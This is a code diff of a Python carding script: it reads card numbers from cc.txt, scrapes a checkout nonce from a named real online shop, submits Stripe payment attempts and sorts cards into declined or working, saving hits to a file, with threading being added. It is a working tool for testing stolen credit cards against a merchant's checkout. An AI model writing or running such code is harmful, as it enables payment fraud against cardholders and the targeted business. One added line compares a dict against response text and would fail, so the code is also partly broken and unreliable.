@@ -84,6 +84,9 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
     }
     response = session.get('https://yarnclub.com.au/checkout/',headers=headers)
+    print(jar)
+    with open("a.txt", "w")as f:
+        f.write(response.text)
     match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
     if match:
         nonce = match.group(1)
@@ -244,19 +247,22 @@ def Tele(ccx):
         'stripe_source': f'{payment_id}'
     }
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
-    if "declined." in response.text:
+    # jar.update(response.cookies)
+
+    if {"result": "success"} in response.text:
+        print(Fore.GREEN + f"{ccx} {response.text}")
+    elif "incorrect." in response.text:
+        print(Fore.GREEN + f"{ccx} The card number is incorrect.")
+    elif "declined." in response.text:
         print(Fore.RED + f"{ccx} declined")
     elif "No such PaymentMethod: 'None'" in response.text:
         print(Fore.RED  + f"{ccx} card detail incoorect 'None'")
-    elif "incorrect." in response.text:
-        print(Fore.GREEN + f"{ccx} The card number is incorrect.")
     else:
         print(Fore.GREEN + f"{ccx}{response.text}")
         with open("q.txt","a+")as f:
             f.write(f"{ccx}{response.text}\n\n")
-    # jar.update(response.cookies)
-    # print(jar)
-
+    print(jar)
+from concurrent.futures import ThreadPoolExecutor
 try:
     with open("cc.txt", "r") as f:
         lines = f.readlines()
